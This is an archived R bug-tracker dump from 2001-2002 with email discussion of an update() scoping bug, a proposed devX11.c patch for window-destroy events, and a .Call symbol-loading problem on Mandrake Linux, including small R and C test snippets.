User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

yzhou@arcturusag.com writes:

> Full_Name: Yi-Xiong Zhou
> Version: 1.5.1
> OS: win2000pro
> Submission from: (NULL) (64.169.249.42)
> 
> 
> Update() can not find objects when it is used in a function, which is in turn
> being called by another function. Here is a R script to show the problem:
> 
> ######## begin of the test script ##########
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    y <- rnorm(20)
>    oo <- lm(y~x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
> 
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
> 
> fun1()
> ########### end of the test script #############
> 
> Here is the result of running this script:
> 
> [1] "step 1"
> [1] "first update success."
> Error in eval(expr, envir, enclos) : Object "y" not found
> 
> Ideally, update should first search the objects in its environment first, then
> its parent's, and grand parent's environments ... Right now, it only searchs its
> own environment and the global environment, skipping its parents'. 

No, that's not what you should expect in a language with lexical scoping. 


However, there might still be a bug, since update with a non-missing
formula argument would extract the formula environment from the
formula stored in the lm object, but that doesn't happen if it is
missing. Modifying fun2 to

function(gg) {
   update(gg,formula(gg))
   print("second update success.")
}

or even

function(gg) {
   update(gg,y~x)
   print("second update success.")
}

does allow your example to run, which is somewhat unexpected...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1861.followup.1 <==
From yzhou@arcturusag.com  Thu Aug  1 19:58:40 2002
Received: from genome.arcturusag.com (mail.arcturusag.com [64.169.249.254])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA28377;
	Thu, 1 Aug 2002 19:58:39 +0200 (MET DST)
Received: by GENOME with Internet Mail Service (5.5.2650.21)
	id <P7TL2JNV>; Thu, 1 Aug 2002 10:53:32 -0700
Message-ID: <BBAF0DEC119BD41193C100B0D0788DFE1D234B@GENOME>
From: Yi-Xiong Zhou <yzhou@arcturusag.com>
To: "'Peter Dalgaard BSA'" <p.dalgaard@biostat.ku.dk>
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: RE: update() can not find objects (PR#1861)
Date: Thu, 1 Aug 2002 10:53:31 -0700 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain

Thanks Peter. This does work for formula. However, it failed to a function
call. Here is another test script:

################# begin test ###############
fun1 <- function() {
   x <- matrix(rnorm(500), 20,25)
   oo <- fun3(x)
   print("step 1")
   update(oo)
   print("first update success.")
   fun2(oo)
}

fun2 <- function(gg) {
   update(gg)
   print("second update success.")
}

fun3 <- function(aa) {
   oo <- list(x=aa, call=match.call())
   oo
}

fun1()
############### end test ############

The error message is 

[1] "step 1"
[1] "first update success."
Error in fun3(aa = x) : Object "x" not found

Yi-Xiong


-----Original Message-----
From: Peter Dalgaard BSA [mailto:p.dalgaard@biostat.ku.dk]
Sent: Thursday, August 01, 2002 10:27 AM
To: Yi-Xiong Zhou
Cc: r-devel@stat.math.ethz.ch; R-bugs@biostat.ku.dk
Subject: Re: update() can not find objects (PR#1861)


yzhou@arcturusag.com writes:

> Full_Name: Yi-Xiong Zhou
> Version: 1.5.1
> OS: win2000pro
> Submission from: (NULL) (64.169.249.42)
> 
> 
> Update() can not find objects when it is used in a function, which is in
turn
> being called by another function. Here is a R script to show the problem:
> 
> ######## begin of the test script ##########
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    y <- rnorm(20)
>    oo <- lm(y~x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
> 
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
> 
> fun1()
> ########### end of the test script #############
> 
> Here is the result of running this script:
> 
> [1] "step 1"
> [1] "first update success."
> Error in eval(expr, envir, enclos) : Object "y" not found
> 
> Ideally, update should first search the objects in its environment first,
then
> its parent's, and grand parent's environments ... Right now, it only
searchs its
> own environment and the global environment, skipping its parents'. 

No, that's not what you should expect in a language with lexical scoping. 


However, there might still be a bug, since update with a non-missing
formula argument would extract the formula environment from the
formula stored in the lm object, but that doesn't happen if it is
missing. Modifying fun2 to

function(gg) {
   update(gg,formula(gg))
   print("second update success.")
}

or even

function(gg) {
   update(gg,y~x)
   print("second update success.")
}

does allow your example to run, which is somewhat unexpected...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1861.followup.2 <==
From tlumley@u.washington.edu  Thu Aug  1 21:37:37 2002
Received: from mxout2.cac.washington.edu (mxout2.cac.washington.edu [140.142.33.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA28674
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 21:37:36 +0200 (MET DST)
Received: from mailscan-out3.cac.washington.edu (mailscan-out3.cac.washington.edu [140.142.32.18])
	by mxout2.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g71Jasej008354
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 12:36:54 -0700
Received: FROM homer26.u.washington.edu BY mailscan-out3.cac.washington.edu ; Thu Aug 01 12:36:52 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer26.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g71Jap8T071380;
	Thu, 1 Aug 2002 12:36:51 -0700
Date: Thu, 1 Aug 2002 12:36:51 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: yzhou@arcturusag.com
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: update() can not find objects (PR#1861)
In-Reply-To: <200208011702.TAA28218@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0208011232100.18384-100000@homer26.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 1 Aug 2002 yzhou@arcturusag.com wrote:
<snip>
> Ideally, update should first search the objects in its environment first, then
> its parent's, and grand parent's environments ... Right now, it only searchs its
> own environment and the global environment, skipping its parents'.
>

No, ideally it should search the objects in the environment where the
model was defined.  There's no guarantee that this is a grandparent, and
grandparents shouldn't be searched otherwise.  It might be tricky to get
this to work.

What isn't clear to me is whether the current environment should be
searched before the environment where the model was defined or afterwards.

	-thomas


==> 1861.followup.3 <==
From tlumley@u.washington.edu  Thu Aug  1 23:14:46 2002
Received: from mxout2.cac.washington.edu (mxout2.cac.washington.edu [140.142.33.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA28971
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 23:14:45 +0200 (MET DST)
Received: from mailscan-out2.cac.washington.edu (mailscan-out2.cac.washington.edu [140.142.33.17])
	by mxout2.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g71LE4ej008711
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 14:14:04 -0700
Received: FROM homer26.u.washington.edu BY mailscan-out2.cac.washington.edu ; Thu Aug 01 14:14:00 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer26.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g71LDx4S055014;
	Thu, 1 Aug 2002 14:14:00 -0700
Date: Thu, 1 Aug 2002 14:13:59 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: Yi-Xiong Zhou <yzhou@arcturusag.com>
cc: "'Peter Dalgaard BSA'" <p.dalgaard@biostat.ku.dk>,
        <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: RE: update() can not find objects (PR#1861)
In-Reply-To: <BBAF0DEC119BD41193C100B0D0788DFE1D234B@GENOME>
Message-ID: <Pine.A41.4.44.0208011405170.18384-100000@homer26.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 1 Aug 2002, Yi-Xiong Zhou wrote:

> Thanks Peter. This does work for formula. However, it failed to a function
> call. Here is another test script:
>
> ################# begin test ###############
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    oo <- fun3(x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
>
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
>
> fun3 <- function(aa) {
>    oo <- list(x=aa, call=match.call())
>    oo
> }
>
> fun1()
> ############### end test ############
>
> The error message is
>
> [1] "step 1"
> [1] "first update success."
> Error in fun3(aa = x) : Object "x" not found

Yes, but this isn't supposed to work, and can't.

In the first place update() is supposed to work on models, not on
arbitrary objects.

In the second place, the object you are returning contains no information
about where it was created, so it's not possible for update to work out
the correct environment.  In this case the correct environment happens to
be parent.frame(2), but there's no reason why this should be true in
general.


When the object is a model with a formula it does carry information about
where it was defined, so update() can look there.  Your first example
should have worked, and the fact that it didn't is a bug (though arguably
just a wishlist bug).  This new example shouldn't work.


	-thomas



==> 1861.followup.4 <==
From yzhou@arcturusag.com  Thu Aug  1 23:25:31 2002
Received: from genome.arcturusag.com (mail.arcturusag.com [64.169.249.254])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA29028;
	Thu, 1 Aug 2002 23:25:29 +0200 (MET DST)
Received: by GENOME with Internet Mail Service (5.5.2650.21)
	id <P7TL2JPY>; Thu, 1 Aug 2002 14:20:22 -0700
Message-ID: <BBAF0DEC119BD41193C100B0D0788DFE1D234C@GENOME>
From: Yi-Xiong Zhou <yzhou@arcturusag.com>
To: "'Thomas Lumley'" <tlumley@u.washington.edu>
Cc: "'Peter Dalgaard BSA'" <p.dalgaard@biostat.ku.dk>,
        r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: RE: update() can not find objects (PR#1861)
Date: Thu, 1 Aug 2002 14:20:13 -0700 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain

Could an object carry the information about where it was created? Could that
be on the wish list? 

Yi-Xiong

-----Original Message-----
From: Thomas Lumley [mailto:tlumley@u.washington.edu]
Sent: Thursday, August 01, 2002 2:14 PM
To: Yi-Xiong Zhou
Cc: 'Peter Dalgaard BSA'; r-devel@stat.math.ethz.ch;
R-bugs@biostat.ku.dk
Subject: RE: update() can not find objects (PR#1861)


On Thu, 1 Aug 2002, Yi-Xiong Zhou wrote:

> Thanks Peter. This does work for formula. However, it failed to a function
> call. Here is another test script:
>
> ################# begin test ###############
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    oo <- fun3(x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
>
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
>
> fun3 <- function(aa) {
>    oo <- list(x=aa, call=match.call())
>    oo
> }
>
> fun1()
> ############### end test ############
>
> The error message is
>
> [1] "step 1"
> [1] "first update success."
> Error in fun3(aa = x) : Object "x" not found

Yes, but this isn't supposed to work, and can't.

In the first place update() is supposed to work on models, not on
arbitrary objects.

In the second place, the object you are returning contains no information
about where it was created, so it's not possible for update to work out
the correct environment.  In this case the correct environment happens to
be parent.frame(2), but there's no reason why this should be true in
general.


When the object is a model with a formula it does carry information about
where it was defined, so update() can look there.  Your first example
should have worked, and the fact that it didn't is a bug (though arguably
just a wishlist bug).  This new example shouldn't work.


	-thomas


==> 1861.audit <==
Thu Aug  1 23:00:21 2002	thomas	moved from incoming to Models
Fri Aug  2 00:01:23 2002	thomas	changed notes
Fri Aug  2 00:01:23 2002	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Startup

none

Directory:  System-specific

* PR# 848 *
Subject: X11 device doesn't handle destroy events correcly
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 13 Feb 2001 17:40:46 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 848 <==
From postmaster@franz.stat.wisc.edu  Tue Feb 13 23:40:36 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA10552
	for <r-bugs@biostat.ku.dk>; Tue, 13 Feb 2001 23:40:36 +0100 (MET)
Received: from infiniti.ece.cmu.edu (really [128.2.133.84]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14So7r-000J2mC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Tue, 13 Feb 2001 16:40:47 -0600 (CST) 
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id RAA70658; Tue, 13 Feb 2001 17:40:46 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: r-bugs@r-project.org
Cc: Thomas Vogels <tov@ece.cmu.edu>
Subject: X11 device doesn't handle destroy events correcly
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 13 Feb 2001 17:40:46 -0500
Message-ID: <px3ddi6wb5.fsf@infiniti.ece.cmu.edu>
Lines: 258
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Hi, there are two problems in devX11.c.  The one is an undocumented
nuisance and the other isn't a bug until you try to embed an X11
device in another window (think tktoplevel() in tcltk package...).

Let's take a look at locator() first: Assuming you call locator() with
a current X11 device, this call is handled in X11_Locator
(src/unix/X11/devX11.c).  When you have one window open and call
locator, you have three options to quit the locator: click Button 1
(to locate), click Button 2 (to abort), or destroy the window.  The
later results in the error message: "Error in locator(1) : No graphics
device is active". That's OK, sort of.

This gets problematic when you open two windows:
> x11()  # assume that's device 2
> x11()  # assume that's device 3
> plot(1)
> locator(1)  # with device 3 == dev.cur()!

When you now destroy device 3 (where locator expects the click), you have
*no alternative but to close _all_ windows* to abort the locator.  The
locator continues to wait for mouse clicks in device 3 where of course
no further clicks can come from.  That's the nuisance part.

The second problem is that the device may try to plot() into a
non-existant window.  Assume that the window was destroyed by some
other part of the program.  The device (at some point in the future)
will receive a DestroyNotify event that handleEvent ignores.
Blissfully!  *No KillDevice is called* when the window is destroyed by
something other than the WM_DELETE_WINDOW mechanism!  This happens
when you embed the X11 device into another window/application.  For
starters, the device no longer receives WM_DELETE_WINDOW client
messages.  But it does receive a DestroyNotify event when the parent
(the container window) is destroyed.  HandleEvent should, well
_handle_ this _event_.

The patch below is a _suggestion_ how to solve both problems.  It is
against the current r-devel, 1.3, as of 2/13.  I believe this behavior
exists in version 1.2 as well and can be solved there the same way.
The patch is just meant as a convenient and concise way to describe
my suggestion.  I'd greatly appreciate feedback or other ideas!

Implementation:

-- the variable inclose is now in the device specific structure (why
   was it global?)  After the window is mapped, inclose is TRUE until
   the window is destroyed explicitly or a DestroyNotify event has been
   received.
-- the deviceSpecific pointer is set to NULL after the memory has been
   freed. This (side?) effect is used in X11_Locator to detect the
   closing of the current device  which _must_ lead to an error.
-- the if statement to handle events of type DestroyEvent is added to 
   handleEvent
-- when the user closes the device (dev.off()), the window is
   destroyed in X11_Close
-- when the user pushes the close button in the window frame, the
   window is destroyed in handleEvent and X11_Close is initiated
   (the WM_DELETE_WINDOW mechanism already in place.)
-- when the window is destroyed for another reason (e.g. the parent
   being destroyed), it is not destroyed again but X11_Close is still
   initiated.

Regards,
  -tom


--------------------------------------------------
*** devX11.c_orig	Tue Feb 13 15:32:24 2001
--- devX11.c	Tue Feb 13 17:24:04 2001
***************
*** 116,121 ****
--- 116,122 ----
      FILE *fp;				/* file for a bitmap device */
      int quality;			/* JPEG quality */
  
+     Rboolean inclose;                   /* TRUE if window is being closed */
  } x11Desc;
  
  
***************
*** 145,151 ****
  static Atom _XA_WM_PROTOCOLS, protocol;
  
  static Rboolean displayOpen = FALSE;
- static Rboolean inclose = FALSE;
  static int numX11Devices = 0;
  
  	/********************************************************/
--- 146,151 ----
***************
*** 619,632 ****
  	xd->windowHeight = event.xconfigure.height;
  	xd->resize = 1;
      }
      else if ((event.type == ClientMessage) &&
! 	     (event.xclient.message_type == _XA_WM_PROTOCOLS))
! 	if (!inclose && event.xclient.data.l[0] == protocol) {
! 	    XFindContext(display, event.xclient.window,
  			 devPtrContext, &temp);
  	    dd = (DevDesc *) temp;
! 	    KillDevice(dd);
  	}
  }
  
  static void R_ProcessEvents(void *data)
--- 619,652 ----
  	xd->windowHeight = event.xconfigure.height;
  	xd->resize = 1;
      }
+     else if (event.type == DestroyNotify) {
+         /* The window is being destroyed, kill the device, too. */
+         XFindContext(display, event.xdestroywindow.window,
+                      devPtrContext, &temp);
+         dd = (DevDesc *) temp;
+         xd = (x11Desc *) dd->deviceSpecific;
+         if (!xd->inclose) {
+             xd->inclose = TRUE;
+             KillDevice(dd);
+         }
+     }
      else if ((event.type == ClientMessage) &&
! 	     (event.xclient.message_type == _XA_WM_PROTOCOLS)) {
! 	if (event.xclient.data.l[0] == protocol) {
!             XFindContext(display, event.xclient.window,
  			 devPtrContext, &temp);
  	    dd = (DevDesc *) temp;
! 	    xd = (x11Desc *) dd->deviceSpecific;
! 	    if (!xd->inclose) {
! 		/* Dispatch destroy only once */
! 		xd->inclose = TRUE;
! 		XDestroyWindow(display, xd->window);
! 		XSync (display, 0);
! 		KillDevice(dd);
! 	    }
  	}
+     }
+ 
  }
  
  static void R_ProcessEvents(void *data)
***************
*** 1208,1213 ****
--- 1228,1234 ----
  		     ExposureMask | ButtonPressMask | StructureNotifyMask);
  	XMapWindow(display, xd->window);
  	XSync(display, 0);
+         xd->inclose = FALSE;
  
  	/* Gobble expose events */
  
***************
*** 1464,1476 ****
      x11Desc *xd = (x11Desc *) dd->deviceSpecific;
  
      if (xd->type == WINDOW) {
! 	/* process pending events */
! 	/* set block on destroy events */
! 	inclose = TRUE;
  	R_ProcessEvents((void*) NULL);
  
  	XFreeCursor(display, xd->gcursor);
- 	XDestroyWindow(display, xd->window);
  	XSync(display, 0);
      } else {
  	if (xd->npages && xd->type != XIMAGE) {
--- 1485,1506 ----
      x11Desc *xd = (x11Desc *) dd->deviceSpecific;
  
      if (xd->type == WINDOW) {
! 	/* There are three reasons to be here: */
! 	/* 1) The user clicked on a button in the window frame */
! 	/*    and we received a DELETE_WINDOW from the wm, */
! 	/* 2) Somebody destroyed our window directly, or if */
! 	/*    embedded, the parent is being destroyed, and so */
! 	/*    we got a DestroyNotify event, too, */
! 	/* 3) The user used dev.off() to get rid of us. Bye. */
! 
! 	if (!xd->inclose) {
! 	    xd->inclose = TRUE;
! 	    XDestroyWindow(display, xd->window);
! 	}
! 	/* process pending events (esp. reap events for this window) */
  	R_ProcessEvents((void*) NULL);
  
  	XFreeCursor(display, xd->gcursor);
  	XSync(display, 0);
      } else {
  	if (xd->npages && xd->type != XIMAGE) {
***************
*** 1517,1523 ****
      }
  
      free(xd);
!     inclose = FALSE;
  }
  
  	/********************************************************/
--- 1547,1553 ----
      }
  
      free(xd);
!     dd->deviceSpecific = NULL;
  }
  
  	/********************************************************/
***************
*** 1858,1866 ****
  		else
  		    done = 2;
  	    }
! 	}
! 	else
  	    handleEvent(event);
      }
      /* if it was a Button1 succeed, otherwise fail */
      return (done == 1);
--- 1888,1901 ----
  		else
  		    done = 2;
  	    }
! 	} else {
  	    handleEvent(event);
+ 	    if (!dd->deviceSpecific) {
+ 		/* Allow new active window to redraw */
+ 		R_ProcessEvents((void*)NULL);
+ 		error ("Device closed while waiting for input.\n");
+ 	    }
+         }
      }
      /* if it was a Button1 succeed, otherwise fail */
      return (done == 1);
--------------------------------------------------




--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Under development (unstable)
 major = 1
 minor = 3.0
 year = 2001
 month = 02
 day = 12
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204


==> 848.followup.1 <==
From pd@biostat.ku.dk  Wed Feb 14 01:10:35 2001
Received: from biostat.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA10968;
	Wed, 14 Feb 2001 01:10:34 +0100 (MET)
Received: (from pd@localhost)
	by biostat.ku.dk (8.9.3/8.9.3) id BAA02066;
	Wed, 14 Feb 2001 01:11:56 +0100
Sender: pd@blueberry.kubism.ku.dk
To: tov@ece.cmu.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] X11 device doesn't handle destroy events correcly (PR#848)
References: <200102132240.XAA10562@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@pubhealth.ku.dk>
Date: 14 Feb 2001 01:11:56 +0100
In-Reply-To: tov@ece.cmu.edu's message of "Tue, 13 Feb 2001 23:40:37 +0100 (MET)"
Message-ID: <x2elx2yvg3.fsf@blueberry.kubism.ku.dk>
Lines: 25
X-Mailer: Gnus v5.7/Emacs 20.7
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

tov@ece.cmu.edu writes:


> Blissfully!  *No KillDevice is called* when the window is destroyed by
> something other than the WM_DELETE_WINDOW mechanism!  This happens
> when you embed the X11 device into another window/application.  For
> starters, the device no longer receives WM_DELETE_WINDOW client
> messages.  But it does receive a DestroyNotify event when the parent
> (the container window) is destroyed.  HandleEvent should, well
> _handle_ this _event_.

Heh. Quite probably, this is also the source of the FVWM trouble
reported earlier although that triggered an infinite loop which should
probably be guarded against by other means as well. 

Thanks for filing this (good to have as bug report so that we don't
forget - it's the sort of thing that often has to wait until someone
has a clear enough mind and sufficient stamina to try and get it
right.)

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 848.audit <==
Sat Feb 17 11:44:41 2001	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1020 *
Subject: .Call and Mandrake 8.0
From: lcottret@yahoo.fr
Date: Wed, 11 Jul 2001 15:34:23 +0200 (MET DST)
--problem with symbol names only on Mandrake 8.0, not 7.2
--needs reply to follow-up
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1020 <==
From lcottret@yahoo.fr  Wed Jul 11 15:34:24 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA16374
	for <R-bugs@biostat.ku.dk>; Wed, 11 Jul 2001 15:34:23 +0200 (MET DST)
Date: Wed, 11 Jul 2001 15:34:23 +0200 (MET DST)
From: lcottret@yahoo.fr
Message-Id: <200107111334.PAA16374@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: .Call and Mandrake 8.0

Full_Name: Ludovic Cottret
Version: R 1.3.0
OS: Linux
Submission from: (NULL) (157.136.20.138)


I have a R function which call a C function by the instruction ".Call".
The first time I call the R function in a R session, it perfectly runs. But the
next 
times, R returns this error message :

Error in .Call("", bankpath, accn, indexpath, key, beg, end) :
        .Call function name not in load table

The function name has disappeared !!
This function well runs on Mandrake 7.2 but not in Mandrake 8.0. Why ?!?

Thanks for your answers...
PS : Excuse my poor english...




==> 1020.followup.1 <==
From duncan@jessie.research.bell-labs.com  Wed Jul 11 16:15:16 2001
Received: from crufty.research.bell-labs.com (crufty.research.bell-labs.com [204.178.16.49])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id QAA16686
	for <R-bugs@biostat.ku.dk>; Wed, 11 Jul 2001 16:15:15 +0200 (MET DST)
Received: from scummy.research.bell-labs.com ([135.104.2.10]) by crufty; Wed Jul 11 10:10:04 EDT 2001
Received: from jessie.research.bell-labs.com ([135.104.13.5]) by scummy; Wed Jul 11 10:13:33 EDT 2001
Received: (from duncan@localhost)
	by jessie.research.bell-labs.com (8.9.1/8.9.1) id KAA02731;
	Wed, 11 Jul 2001 10:13:07 -0400 (EDT)
Date: Wed, 11 Jul 2001 10:13:07 -0400
From: Duncan Temple Lang <duncan@research.bell-labs.com>
To: lcottret@yahoo.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] .Call and Mandrake 8.0 (PR#1020)
Message-ID: <20010711101307.E24919@jessie.research.bell-labs.com>
Mail-Followup-To: lcottret@yahoo.fr, r-devel@stat.math.ethz.ch,
	R-bugs@biostat.ku.dk
References: <200107111334.PAA16384@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
X-Mailer: Mutt 1.0us
In-Reply-To: <200107111334.PAA16384@pubhealth.ku.dk>; from lcottret@yahoo.fr on Wed, Jul 11, 2001 at 03:34:25PM +0200

Hi Ludovic.

 There are at least two possible explanations for this behaviour.

  1)  There is a bug in the recently changed code in R to find 
     routines in C and Fortran libraries.

  2)  The routine that you are .Call()'ing is doing something
  that has confused the R internals and makes the next R commands
  not work, and potentially this is not reproducible.

If this is not proprietary or confidential code, you can send the C
code and instructions as to how to call it from R (that is, provide
simple values for the bankpath, accn, indexpath, key, beg and end
arguments), then I can see if the computations are potentially
writing over other values in memory.

Also, you can try a invoking a very simple .Call() routine 
many times to see if that displays the same failure. For example,
put the following C code in a file named simpleCall.c

#include "Rinternals.h"

SEXP
simpleCall() 
{
  static int count = 0;
  SEXP ans;

  PROTECT(ans = allocVector(INTSXP, 1));
  INTEGER(ans)[0] = count++;

  UNPROTECT(1);
  return(ans);
}

Then, compile this with 
  R CMD SHLIB simpleCall.c

and call it from R in the following way

 > dyn.load("simpleCall.so")
 > for(i in 1:10) { print(.Call("simpleCall")) }

If this works, it won't determine whether it is 1) or 2) (or any other
possible reason), but if it doesn't work, we will have a lot more
information.

 Thanks,
   Duncan


lcottret@yahoo.fr wrote:
> Full_Name: Ludovic Cottret
> Version: R 1.3.0
> OS: Linux
> Submission from: (NULL) (157.136.20.138)
> 
> 
> I have a R function which call a C function by the instruction ".Call".
> The first time I call the R function in a R session, it perfectly runs. But the
> next 
> times, R returns this error message :
> 
> Error in .Call("", bankpath, accn, indexpath, key, beg, end) :
>         .Call function name not in load table
> 
> The function name has disappeared !!
> This function well runs on Mandrake 7.2 but not in Mandrake 8.0. Why ?!?
> 
> Thanks for your answers...
> PS : Excuse my poor english...
> 
> 
> 
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._

-- 
_______________________________________________________________

Duncan Temple Lang                duncan@research.bell-labs.com
Bell Labs, Lucent Technologies    office: (908)582-3217
700 Mountain Avenue, Room 2C-259  fax:    (908)582-3340
Murray Hill, NJ  07974-2070       
         http://cm.bell-labs.com/stat/duncan

==> 1020.audit <==
Fri Aug  3 11:33:04 2001	ripley	changed notes
Fri Aug  3 11:33:04 2001	ripley	foobar
Fri Aug  3 11:33:04 2001	ripley	moved from incoming to System-specific
Tue Aug  7 08:37:20 2001	ripley	changed notes
Tue Aug  7 08:37:20 2001	ripley	foobar

==> 1020.followup.2 <==
From mikalzet@libero.it  Fri Dec  7 12:44:05 2001
Received: from smtp3.libero.it (smtp3.libero.it [193.70.192.53])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07110
	for <r-bugs@biostat.ku.dk>; Fri, 7 Dec 2001 12:44:04 +0100 (MET)
From: mikalzet@libero.it
Received: from localhost.localdomain (151.25.109.136) by smtp3.libero.it (6.0.032)
        id 3BD43E2500FA2042 for r-bugs@biostat.ku.dk; Fri, 7 Dec 2001 12:43:26 +0100
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by localhost.localdomain (Postfix) with ESMTP id 477AB1D9C
	for <r-bugs@biostat.ku.dk>; Fri,  7 Dec 2001 12:43:25 +0100 (CET)
Date: Fri, 7 Dec 2001 12:43:25 +0100 (CET)
X-X-Sender:  <mike@localhost.localdomain>
To: <r-bugs@biostat.ku.dk>
Subject: bug PR#1020
Message-ID: <Pine.LNX.4.33L2.0112071238100.3318-100000@localhost.localdomain>
Return-Receipt-To: mikalzet@libero.it
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


Found it on the site.
I tried duncan's suggestion.

#include "Rinternals.h"

SEXP
simpleCall()
{
  static int count = 0;
  SEXP ans;

  PROTECT(ans = allocVector(INTSXP, 1));
  INTEGER(ans)[0] = count++;

  UNPROTECT(1);
  return(ans);
}


If I had read this before I could have checked on mandrake 8.0

Here is my output on mandrake 8.1:

> dyn.load("simpleCall.so")
> for(i in 1:10) { print(.Call("simpleCall")) }

[1] 0
[1] 1
[1] 2
